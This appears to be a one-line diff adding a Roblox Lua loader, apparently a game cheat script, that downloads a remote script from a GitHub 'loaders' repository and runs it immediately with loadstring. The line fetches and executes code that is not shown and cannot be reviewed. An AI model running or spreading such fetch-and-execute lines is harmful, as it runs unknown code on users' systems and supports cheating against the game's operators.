@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/drill-to-earth-s-core-spam1-nx1uywxdgtydb8.lua"))()
